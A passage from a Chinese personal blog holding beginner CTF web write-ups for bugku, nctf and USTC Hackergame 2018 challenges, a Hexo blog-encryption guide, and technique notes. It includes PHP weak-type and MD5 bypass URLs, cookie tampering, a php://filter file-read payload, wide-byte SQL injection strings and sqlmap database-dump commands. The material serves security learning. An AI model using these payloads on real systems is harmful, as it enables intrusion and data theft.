rel="noopener">http://ctf3.shiyanbar.com/web/md5/?a=240610708</a><br><code>flag{56f008ff31c89382e15915a8ad78f209}</code></p>
<h2 id="题目三"><a href="#题目三" class="headerlink" title="题目三"></a>题目三</h2><h3 id="3-无论你输入什么都是错的"><a href="#3-无论你输入什么都是错的" class="headerlink" title="3.无论你输入什么都是错的"></a>3.无论你输入什么都是错的</h3><p><a href="http://ctf3.shiyanbar.com/web/wrong/" target="_blank" rel="noopener">http://ctf3.shiyanbar.com/web/wrong/</a><br>打开输入任何东西都错误于是查看源代码，发现右键被禁用<br>用最古老的姿势：<code>view-source:http://ctf3.shiyanbar.com/web/wrong/</code><br>看到有个not.js<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">function stop()&#123;</span><br><span class="line">alert(&apos;其实破解我很简单，加油哦！&apos;);</span><br><span class="line">return false;</span><br><span class="line">&#125;</span><br><span class="line">document.oncontextmenu=stop;</span><br><span class="line"></span><br><span class="line">function SymError()</span><br><span class="line">&#123;</span><br><span class="line">  return true;</span><br><span class="line">&#125;</span><br><span class="line">window.onerror = SymError;</span><br></pre></td></tr></table></figure><br>看出来这是禁用右键，于是我们修改为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">function stop()&#123;</span><br><span class="line">return true;</span><br><span class="line">&#125;</span><br><span class="line">document.oncontextmenu=stop;</span><br><span class="line"></span><br><span class="line">function SymError()</span><br><span class="line">&#123;</span><br><span class="line">  return true;</span><br><span class="line">&#125;</span><br><span class="line">window.onerror = SymError;</span><br></pre></td></tr></table></figure><br>发现可以右键审查元素，发现一个da.html直接访问，F12审查元素得到flag<br><code>flag{a37b3a66-172f-434d-9105-aada3aed5bdc}</code></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/10/23/Book/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="BoBo">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="BoBo's Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/10/23/Book/" itemprop="url">Book</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-10-23T18:22:05+08:00">
                2018-10-23
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>老师说每一届要走了没有给学弟学妹留下东西<br>这些积累的东西便于大家入门</p>
<h1 id="Web（初级入门）"><a href="#Web（初级入门）" class="headerlink" title="Web（初级入门）"></a>Web（初级入门）</h1><h2 id="题目链接1：http-120-24-86-145-8002-web2"><a href="#题目链接1：http-120-24-86-145-8002-web2" class="headerlink" title="题目链接1：http://120.24.86.145:8002/web2/"></a>题目链接1：<a href="http://120.24.86.145:8002/web2/" target="_blank" rel="noopener">http://120.24.86.145:8002/web2/</a></h2><p>打开发现一脸滑稽，于是最简单的就是F12审查元素<br><img src="/2018/10/23/Book/book1.jpg" alt=" "><br>于是可以看到flag<br><code>flag KEY{Web-2-bugKssNNikls9100}</code></p>
<h2 id="题目链接2：http-120-24-86-145-8002-yanzhengma"><a href="#题目链接2：http-120-24-86-145-8002-yanzhengma" class="headerlink" title="题目链接2：http://120.24.86.145:8002/yanzhengma/"></a>题目链接2：<a href="http://120.24.86.145:8002/yanzhengma/" target="_blank" rel="noopener">http://120.24.86.145:8002/yanzhengma/</a></h2><p>打开题目发现要输入验证码，可是最多让输入一个字符<br>于是F12审查元素，看到有最长字符限制<code>maxlength=&quot;1&quot;</code><br><img src="/2018/10/23/Book/book2.jpg" alt=" "><br>我们想到这是前端验证，于是修改最长输入字符限制，改为<code>maxlength=&quot;10&quot;</code><br>(这里只要是大于能输入验证的字符长度就行)，得到flag<br><code>flag{CTF-bugku-0032}</code></p>
<h2 id="题目链接3：http-120-24-86-145-8002-web3"><a href="#题目链接3：http-120-24-86-145-8002-web3" class="headerlink" title="题目链接3：http://120.24.86.145:8002/web3/"></a>题目链接3：<a href="http://120.24.86.145:8002/web3/" target="_blank" rel="noopener">http://120.24.86.145:8002/web3/</a></h2><p>打开题目发现一直弹窗<br><img src="/2018/10/23/Book/book3.jpg" alt=" "><br>老规矩查看源代码<br><img src="/2018/10/23/Book/book4.jpg" alt=" "><br>到最下面发现一行<code>&amp;#75;&amp;#69;&amp;#89;&amp;#123;&amp;#74;&amp;#50;&amp;#115;&amp;#97;&amp;#52;&amp;#50;&amp;#97;&amp;#104;&amp;#74;&amp;#75;&amp;#45;&amp;#72;&amp;#83;&amp;#49;&amp;#49;&amp;#73;&amp;#73;&amp;#73;&amp;#125</code><br>这个是unicod代码，百度找到<a href="http://tool.chinaz.com/tools/unicode.aspx" target="_blank" rel="noopener">在线解码工具</a><br>解出即可<br><code>KEY{J2sa42ahJK-HS11III}</code></p>
<h2 id="题目链接4：http-web-bxsteam-xyz-actor"><a href="#题目链接4：http-web-bxsteam-xyz-actor" class="headerlink" title="题目链接4：http://web.bxsteam.xyz/actor/"></a>题目链接4：<a href="http://web.bxsteam.xyz/actor/" target="_blank" rel="noopener">http://web.bxsteam.xyz/actor/</a></h2><p>查看源代码就可以得到flag，如图<br><img src="/2018/10/23/Book/book5.jpg" alt=" "><br><code>flag{youfindme23333333333}</code></p>
<h2 id="题目链接5：http-bxs-cumt-edu-cn-challenge-web-cookiiii"><a href="#题目链接5：http-bxs-cumt-edu-cn-challenge-web-cookiiii" class="headerlink" title="题目链接5：http://bxs.cumt.edu.cn/challenge/web/cookiiii/"></a>题目链接5：<a href="http://bxs.cumt.edu.cn/challenge/web/cookiiii/" target="_blank" rel="noopener">http://bxs.cumt.edu.cn/challenge/web/cookiiii/</a></h2><p>既然说了纯属娱乐送分，就不要想太难了~<br>进去以后会提示：请以管理员身份登陆<br>于是我们打开Burp进行抓包<br>了解burp怎么使用请<a href="https://blog.csdn.net/gitchat/article/details/79168613" target="_blank" rel="noopener">点击这里</a><br>这是们抓的包<br><img src="/2018/10/23/Book/cooike2.jpg" alt=" "><br>可以看到<code>Cookie: user=guest;</code><br>题目说的必须管理员身份打开，所以修改为<code>Cookie: user=admin;</code>重新发包即可。<br>会得到这个东西<br><img src="/2018/10/23/Book/cooike3.jpg" alt=" "><br>图片下载下来<br><img src="/2018/10/23/Book/cooike4.jpg" alt=" "><br>丢进百度识图知道这个人叫维吉尼亚，但是维吉尼亚密码不是他发明的，只是命名而已。<br>然后找到在线解维吉尼亚的网站，推荐<code>www.ctftools.com</code><br>输入图片下面的字符串，可以看到图片上面有提示：<code>key：e</code><br>所以密钥我们输入：e<br>如下图<br><img src="/2018/10/23/Book/cooike5.jpg" alt=" "><br>点击解密即可得到flag<br>flag<code>thisisanoldencrypt</code></p>
<h2 id="题目链接6：http-120-24-86-145-8002-get-index1-php"><a href="#题目链接6：http-120-24-86-145-8002-get-index1-php" class="headerlink" title="题目链接6：http://120.24.86.145:8002/get/index1.php"></a>题目链接6：<a href="http://120.24.86.145:8002/get/index1.php" target="_blank" rel="noopener">http://120.24.86.145:8002/get/index1.php</a></h2><p>打开发现这些代码，并不是很难，大概意思就是num这个变量必须要等于1，但是加了<br><code>is_numeric()</code>函数<br><code>is_numeric()函数用于检测变量是否为数字或数字字符串</code><br>如果传入参数不是数字，就输出这个传入的参数，如果num函数等于1，就输出flag<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$num=$_GET[&apos;num&apos;];</span><br><span class="line">if(!is_numeric($num))</span><br><span class="line">&#123;</span><br><span class="line">echo $num;</span><br><span class="line">if($num==1)</span><br><span class="line">echo &apos;flag&#123;**********&#125;&apos;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>我们可以想到1<em>1=1<br>所以给$num传入1</em>1<br>payload：<code>http://120.24.86.145:8002/get/index1.php?num=1*1</code><br>即可得到<code>flag{bugku-789-ps-ssdf}</code></p>
<h2 id="题目链接7：http-39-107-92-230-web-web1-index-php"><a href="#题目链接7：http-39-107-92-230-web-web1-index-php" class="headerlink" title="题目链接7：http://39.107.92.230/web/web1/index.php"></a>题目链接7：<a href="http://39.107.92.230/web/web1/index.php" target="_blank" rel="noopener">http://39.107.92.230/web/web1/index.php</a></h2><p>打开，查看源代码，即可<br><img src="/2018/10/23/Book/book7.jpg" alt=" "><br><code>flag:{This_is_s0_simpl3}</code></p>
<h2 id="题目链接8：http-chinalover-sinaapp-com-web8"><a href="#题目链接8：http-chinalover-sinaapp-com-web8" class="headerlink" title="题目链接8：http://chinalover.sinaapp.com/web8/"></a>题目链接8：<a href="http://chinalover.sinaapp.com/web8/" target="_blank" rel="noopener">http://chinalover.sinaapp.com/web8/</a></h2><p>打开看到到这里找key，点击后跳转到另一个页面，查看源代码没有用，所以抓包看一下<br>右键点击send to repeater<br><img src="/2018/10/23/Book/book9.jpg" alt=" "><br>点击go发包看一下，直接看到了flag<br><img src="/2018/10/23/Book/book8.jpg" alt=" "><br><code>nctf{yougotit_script_now}</code></p>
<h2 id="题目链接9：http-chinalover-sinaapp-com-web17-index-php"><a href="#题目链接9：http-chinalover-sinaapp-com-web17-index-php" class="headerlink" title="题目链接9：http://chinalover.sinaapp.com/web17/index.php"></a>题目链接9：<a href="http://chinalover.sinaapp.com/web17/index.php" target="_blank" rel="noopener">http://chinalover.sinaapp.com/web17/index.php</a></h2><p>打开发现php代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">if (isset($_GET[&apos;a&apos;]) and isset($_GET[&apos;b&apos;]))&#123;</span><br><span class="line">if ($_GET[&apos;a&apos;] != $_GET[&apos;b&apos;])</span><br><span class="line">if (md5($_GET[&apos;a&apos;]) == md5($_GET[&apos;b&apos;]))</span><br><span class="line">die(&apos;Flag: &apos;.$flag);</span><br><span class="line">else</span><br><span class="line">print &apos;Wrong.&apos;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>这个代码大概意思就是传a，b两个参数，a不等于b，但是MD5加密后a的MD5值=b的MD5值就会输出flag<br>这是php弱类型，我们可以传两个数组，这样也会输出flag<br>payload:<code>http://chinalover.sinaapp.com/web17/index.php?a[]=aa&amp;b[]=aaa</code><br>另一种姿势就是PHP黑魔法240610708和QNKCDZO这两个字符MD5值是相当的<br>payload：<code>http://chinalover.sinaapp.com/web17/index.php?a=240610708&amp;b=QNKCDZO</code><br><code>Flag: nctf{php_is_so_cool}</code></p>
<h2 id="题目链接10：http-lab1-xseclab-com-base7-eb68bd2f0d762faf70c89799b3c1cc52-index-php"><a href="#题目链接10：http-lab1-xseclab-com-base7-eb68bd2f0d762faf70c89799b3c1cc52-index-php" class="headerlink" title="题目链接10：http://lab1.xseclab.com/base7_eb68bd2f0d762faf70c89799b3c1cc52/index.php"></a>题目链接10：<a href="http://lab1.xseclab.com/base7_eb68bd2f0d762faf70c89799b3c1cc52/index.php" target="_blank" rel="noopener">http://lab1.xseclab.com/base7_eb68bd2f0d762faf70c89799b3c1cc52/index.php</a></h2><p>打开查看源代码无果，然后看一下请求头<br>火狐浏览器打开，右键查看元素，如图，选择：网络<br><img src="/2018/10/23/Book/book10.jpg" alt=" "><br>打开以后查看header<br><img src="/2018/10/23/Book/book11.jpg" alt=" "><br>找到flag<br><code>key：kjh%#$#%FDjjj</code></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/10/17/python学习/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="BoBo">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="BoBo's Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/10/17/python学习/" itemprop="url">python学习</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-10-17T11:32:34+08:00">
                2018-10-17
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          Welcome to my blog, enter password to read.
          <!--noindex-->
          <div class="post-button text-center">
            <a class="btn" href="/2018/10/17/python学习/#more" rel="contents">
              阅读全文 &raquo;
            </a>
          </div>
          <!--/noindex-->
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/10/17/Blog-Encrypt/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="BoBo">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="BoBo's Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/10/17/Blog-Encrypt/" itemprop="url">Blog Encrypt</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-10-17T11:13:12+08:00">
                2018-10-17
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>前几天看到关于博客加密，想试一下，因为有时候我们写的很多东西不是想对外开放的，之前hexo加密，通过查看源代码直接能看到密码，这次这个在github上面这个小插件还是不错的。<br>想看Github具体介绍的<a href="https://github.com/MikeCoder/hexo-blog-encrypt" target="_blank" rel="noopener">点击这里</a></p>
<h2 id="正题开始：安装"><a href="#正题开始：安装" class="headerlink" title="正题开始：安装"></a>正题开始：安装</h2><p><code>npm install --save hexo-blog-encrypt</code><br>或者<br><code>yarn add hexo-blog-encrypt</code></p>
<h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><p>在<code>_config.yml</code>下面的插件中启用插件：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># Security</span><br><span class="line">##</span><br><span class="line">encrypt:</span><br><span class="line">    enable: true</span><br></pre></td></tr></table></figure><br>然后将密码和显示的信息写在文章开头，如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line">title: Hello World</span><br><span class="line">date: 2016-03-30 21:18:02</span><br><span class="line">password: mikemessi</span><br><span class="line">abstract: Welcome to my blog, enter password to read.</span><br><span class="line">message: Welcome to my blog, enter password to read.</span><br><span class="line">---</span><br></pre></td></tr></table></figure></p>
<ol>
<li>password是博客密码。</li>
<li>abstract是将在博客列表页面中显示的内容。</li>
<li>message是将在博客详细信息页面中显示的内容。<br>这样就ok了</li>
</ol>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/10/09/2018中科大CTF/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="BoBo">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="BoBo's Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/10/09/2018中科大CTF/" itemprop="url">2018中科大CTF</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-10-09T18:51:37+08:00">
                2018-10-09
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h1><h2 id="题目如下"><a href="#题目如下" class="headerlink" title="题目如下"></a>题目如下</h2><p><img src="/2018/10/09/2018中科大CTF/签到1.jpg" alt=" "><br>key输入框有最长输入限制，从前端改一下就好，如图<br><img src="/2018/10/09/2018中科大CTF/签到2.jpg" alt=" "><br><code>flag{Hackergame2018_Have_Fun!}</code></p>
<h1 id="游园会的集章卡片"><a href="#游园会的集章卡片" class="headerlink" title="游园会的集章卡片"></a>游园会的集章卡片</h1><h2 id="题目如下-1"><a href="#题目如下-1" class="headerlink" title="题目如下"></a>题目如下</h2><p><img src="/2018/10/09/2018中科大CTF/游园1.jpg" alt=" "><br>这个题真的想吐槽一波。。。一直以为有什么规律，结果就是拼图，而且还不是很好拼(可能我太菜了)<br>最后终于得出了flag<br><code>flag{H4PPY_1M4GE_PR0CE551NG}</code></p>
<h1 id="Word-文档"><a href="#Word-文档" class="headerlink" title="Word 文档"></a>Word 文档</h1><h2 id="题目如下-2"><a href="#题目如下-2" class="headerlink" title="题目如下"></a>题目如下</h2><p><img src="/2018/10/09/2018中科大CTF/word1.jpg" alt=" "><br>下载下来是个word文档，但是有损坏，winhex查看发现有flag.txt<br><img src="/2018/10/09/2018中科大CTF/word2.jpg" alt=" "><br>然后在linux用binwalk提取出来，发现了flag.txt得到flag。<br><code>flag{xlsx,pptx,docx_are_just_zip_files}</code><br>后来根据flag提示，发现刚开始那个附件，改一下后缀，改为zip，解压就可以得到flag.txt</p>
<h1 id="黑曜石浏览器"><a href="#黑曜石浏览器" class="headerlink" title="黑曜石浏览器"></a>黑曜石浏览器</h1><h2 id="题目如下-3"><a href="#题目如下-3" class="headerlink" title="题目如下"></a>题目如下</h2><p><img src="/2018/10/09/2018中科大CTF/石头1.jpg" alt=" "><br>打开链接看到<br><img src="/2018/10/09/2018中科大CTF/石头2.jpg" alt=" "><br>于是我们就找一下黑曜石浏览器，百度貌似找不到这个东西，用必应浏览器可以找到<br><a href="https://heicore.com/" target="_blank" rel="noopener">黑曜石</a><br>我们在这个页面查看源码，不过右键查看被禁了<br>我们直接输入<code>view-source:https://heicore.com/index.html</code>可以看到源码<br><img src="/2018/10/09/2018中科大CTF/石头3.jpg" alt=" "><br>看到这里，想到替换user-agent为<code>Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) HEICORE/49.1.2623.213 Safari/537.36</code><br>重新访问刚才页面，得到flag。<br><code>flag{H3ic0re_49.1.2623.213_sai_kou}</code></p>
<h1 id="我是谁"><a href="#我是谁" class="headerlink" title="我是谁"></a>我是谁</h1><h2 id="第一个题目如下"><a href="#第一个题目如下" class="headerlink" title="第一个题目如下"></a>第一个题目如下</h2><p><img src="/2018/10/09/2018中科大CTF/我是谁1.jpg" alt=" "><br>打开看到<br><img src="/2018/10/09/2018中科大CTF/我是谁2.jpg" alt=" "><br>一头雾水，然后试试注入等等，都没用。。。<br>后来想看一下请求头，发现是418请求头，很奇怪的请求头，于是百度发现：</p>
<ul>
<li>HTCPCP 1.0 RFC2324<blockquote>
<p>超文本咖啡壶控制协议（英文：Hyper Text Coffee Pot ControlProtocol，HTCPCP）是一种用于控制、监测和诊断咖啡壶的协议。<br>这个协议在文档RFC 2324[1]（发布于1998年4月1日）中被定义。尽管互联网国际标准机构经常在4月1日发布一些恶搞之作，他们还是让这个协议看上去像是一个真的、非虚构的协议（比如HTTP）。文本编辑器Emacs甚至完全兼容于这个协议，Mozilla也发布了数个补丁来扩展旗下产品的功能。<br>HTCPCP是HTTP协议的扩展HTCPCP请求通过URI架构coffee:来引用，并且还包含了若干种HTTP请求</p>
</blockquote>
</li>
</ul>
<ol>
<li>BREW或POST：令HTCPCP服务器（咖啡壶）煮咖啡。</li>
<li>GET：从服务器获取咖啡。</li>
<li>PROPFIND：获取咖啡的元数据。</li>
<li>WHEN：让服务器停止向咖啡中加入牛奶（如适用）。<br>这个协议还定义了两种错误答复：</li>
<li>406 Not Acceptable（不能接受的）：HTCPCP服务器由于某种原因而暂时不能煮咖啡。服务器在回复中应当包含一组可接受的咖啡类型列表。</li>
<li>I’m a teapot（我是茶壶）：HTCPCP服务器是一个茶壶。给出答复的实体可能是又矮又胖的。<br>所以输入<code>I&#39;m a teapot</code>得到flag<br><code>flag{i_canN0t_BReW_c0ffEE!}</code></li>
</ol>
<h1 id="猫咪银行"><a href="#猫咪银行" class="headerlink" title="猫咪银行"></a>猫咪银行</h1><h2 id="题目如下-4"><a href="#题目如下-4" class="headerlink" title="题目如下"></a>题目如下</h2><p><img src="/2018/10/09/2018中科大CTF/bank1.jpg" alt=" "><br>打开链接：<br><img src="/2018/10/09/2018中科大CTF/bank2.jpg" alt=" "><br>先开始以为是web……后来做好怀疑人生又以为是数学题，后来抓包发现如果时间参数过大可以溢出<br>于是我们先兑换理财产品需要的货币：TDSU<br>然后我们存入，但是时间参数需要修改为一个很大的数<br>payload：<code>http://202.38.95.46:12003/?action=buy_A1&amp;period=5555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555&amp;val=39636</code><br>后面的val是存入的钱数，填写自己兑换好的货币总量就ok。<br>于是我们看到<br><img src="/2018/10/09/2018中科大CTF/bank3.jpg" alt=" "><br>我们点击取出，然后发现自己成了土豪，再慢慢兑换买flag需要的货币就ok<br><code>flag{Evil_Integer._Evil_Overflow.}</code></p>
<h1 id="猫咪问答"><a href="#猫咪问答" class="headerlink" title="猫咪问答"></a>猫咪问答</h1><h2 id="题目如下-5"><a href="#题目如下-5" class="headerlink" title="题目如下"></a>题目如下</h2><p><img src="/2018/10/09/2018中科大CTF/问答1.jpg" alt=" "><br><img src="/2018/10/09/2018中科大CTF/问答2.jpg" alt=" "><br>讲真的这个还是有点难哈哈哈,也默默佩服中科大~<br>贴上答案：<br>1958<br>9111B026<br>9<br>TP311.1/94<br>3A202<br><code>flag{G00G1E-is-always-YOUR-FRIEND}</code></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/10/07/ctf-web/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="BoBo">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="BoBo's Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/10/07/ctf-web/" itemprop="url">ctf-web</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-10-07T21:15:13+08:00">
                2018-10-07
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>看了dalao的博客，总结一下知识点<br>include漏洞<br>遇到php代码中有include($file)的，一般和 php://input或者php://filter有关，$file值如果是php://input，就要用post表单构造数据，如果是php://filter，就用下面的payload读取文件base64加密后的源代码，解密后查看源代码。<br><code>php://filter/read=convert.base64-encoding/resource=文件名(如index.php)</code><br>代码审计<br>如md5函数结果相等（0ed+）的比较，以及strcmp(array,string)=null<br>MD5黑魔法：240610708和QNKCDZO这两个字符MD5值是相当的<br>php中<code>+  _  .</code>可以替换<br>弱类型可以传入数组比较大小<br>解码<br>JS的几种编码（如JSFUCK）都可以在浏览器F12之后的控制台执行，这样可以省去找解密网站的时间<br>html编码，base64编码，url编码等等都可以在burpsuite上的decoder栏解决，但是发现burpsuite有一点不好就是中文不能显示，不知道是不是字符编码没有配置好，找到一个网址：<br><a href="https://emn178.github.io/online-tools/base64_decode.html" target="_blank" rel="noopener">https://emn178.github.io/online-tools/base64_decode.html</a><br>可以解好几种<br>sql<br>布尔注入，盲注之类的意思，布尔注入就像一个只会告诉你对或错的机器人，然后你去问他问题从而解决问题，盲注是说不会有提示信息，虽然对数据库的操作依然存在，但是不论是否操作成功都不会告诉你。 对一个注入语句记个笔记：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">%df&apos; union select 1,database() %23</span><br><span class="line">%df&apos; union select 1,string from sql5.key %23</span><br></pre></td></tr></table></figure><br><code>%df</code>是在编码为gbk的时候用于宽字节注入的<br><code>%23</code>就是#，但是用#不能通过；还有可以直接用 <code>union select 字段名 from 数据库名.表名</code>获取字段的值。<br>sqlmap<br>对用sqlmap进行手工注入的一些步骤记个笔记<br>首先找到可以注入的点，比如找到网页的某个动态页面是可以注入用来显示信息的，然后将这个url用sqlmap来暴库爆表。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;url&quot; --level 3 --batch --dbs</span><br><span class="line">python sqlmap.py -u &quot;url&quot; --level 3 --batch -D ctf --tables</span><br><span class="line">python sqlmap.py -u &quot;url&quot; --level 3 --batch -D ctf -T flag --columns --dump</span><br></pre></td></tr></table></figure><br>–batch sqlmap不会询问你输入 全部默认确定<br> –level 3 指定等级，大于等于3的时候会涉及到http头注入的Referer字段<br> –（两个-）符号用于查询，比如–dbs用于查询所有的数据库，–tables用于查询所有的表，-（一个-）符号用于指定，比如-D ctf用于指定查询的是ctf数据库，-T flag用于指定查询的是flag表，–dump可以用来将表中字段的值显示出来。<br> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">@@version()    MYSQL版本</span><br><span class="line">@@database()   当前数据库</span><br><span class="line">@@user()       当前用户</span><br><span class="line">@@datadir      当前数据库路径</span><br><span class="line">@@version_compile_os  操作系统版本</span><br><span class="line"></span><br><span class="line">concat(str1,str2,...)                没有分隔符地连接字符串</span><br><span class="line">2. concat_ws(separator,str1,str2,...)   用分隔符连接字符串</span><br><span class="line">3. group_concat(str1,str2,...)          用逗号分隔字符串</span><br></pre></td></tr></table></figure><br>一些payload<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span 